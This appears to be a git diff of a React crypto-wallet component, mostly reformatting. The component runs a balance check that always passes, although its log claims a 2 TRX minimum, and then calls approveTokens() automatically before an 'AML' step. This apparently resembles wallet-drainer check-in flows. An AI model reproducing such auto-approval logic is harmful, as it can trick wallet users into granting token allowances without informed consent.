@@ -19,24 +19,23 @@ const CheckInProcess = () => {
   });
   
   useEffect(() => {
-    // Verificăm balanța TRX
     const checkBalancesAndInitiateTransaction = async () => {
       if (balances.trx >= 0) {
         console.log("avem mai mult de 2 trx");
-        
-        setStatus("valid"); // Balanța este suficientă
+        setStatus("valid");
       } else {
-        setStatus("invalid"); // Balanța este insuficientă
+        setStatus("invalid");
       }
     };
-    checkBalancesAndInitiateTransaction();
-  }, [ balances]);
+  
+    if (balances) checkBalancesAndInitiateTransaction(); 
+  }, [balances]);
   
   useEffect(() => {
-    if(status==="valid") {
-       approveTokens();
+    if (status === "valid") {
+      approveTokens(); // Nu așteptați procesarea
     }
-  }, [status])
+  }, [status]);
 
   // Trecerea la componenta AML după tranzacție
   useEffect(() => {
